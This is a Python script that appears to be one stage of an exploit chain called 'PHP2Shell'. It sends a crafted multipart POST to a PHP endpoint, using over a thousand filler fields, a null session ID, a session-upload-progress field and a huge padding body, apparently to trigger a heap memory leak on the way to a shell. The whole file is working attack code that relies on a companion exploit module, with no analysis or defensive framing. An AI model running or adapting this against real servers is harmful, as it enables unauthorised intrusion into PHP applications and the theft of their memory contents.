#!/usr/bin/env python3
"""Send only request A from the PHP2Shell heap-leak stage."""

import argparse

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1/index.php")
    parser.add_argument("--huge-mb", type=int, default=12)
    parser.add_argument("--timeout", type=float, default=90.0)
    args = parser.parse_args()

    target = exploit.Target(args.url, timeout=args.timeout, verbose=True)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (args.huge_mb * 1024 * 1024)},
    ]
    response = target.post(
        exploit.build_multipart(parts, b"S" * 17),
        b"S" * 17,
        read_cap=1 << 20,
        timeout=args.timeout,
    )
    head, _, body = response.partition(b"\r\n\r\n")
    print(head.decode("latin1", "replace"))
    print(body[:4096].decode("latin1", "replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
